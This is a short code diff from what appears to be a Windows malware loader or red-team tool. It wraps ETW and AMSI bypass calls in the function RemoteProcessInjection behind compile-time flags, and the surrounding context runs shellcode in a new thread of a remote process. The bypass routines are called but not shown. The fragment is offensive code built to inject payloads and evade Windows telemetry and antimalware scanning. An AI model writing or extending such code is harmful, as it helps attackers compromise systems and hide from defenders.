@@ -51,18 +51,22 @@ BOOL RemoteProcessInjection(HANDLE hProcess, LPWSTR szProcessName, PBYTE pPayloa
 		return FALSE;
 	}
 	
+#ifdef ETW_BYPASS
 	//	apply ETW bypass
 	if (!applyEtwBypass(hProcess)) {
 		DebugPrint("[!] Failed To Apply ETW Bypass \n");
 		return FALSE;
 	}
+#endif
 
+#ifdef AMSI_BYPASS
 	//	apply AMSI bypass
 	if (!applyAmsiBypass(hProcess)) {
 		DebugPrint("[!] Failed To Apply AMSI Bypass \n");
 		CloseHandle(hThread);
 		return FALSE;
 	}
+#endif
 
 	// Running the shellcode as a new thread's entry in the remote process
 	DebugPrint("[i] Executing Payload...\n");
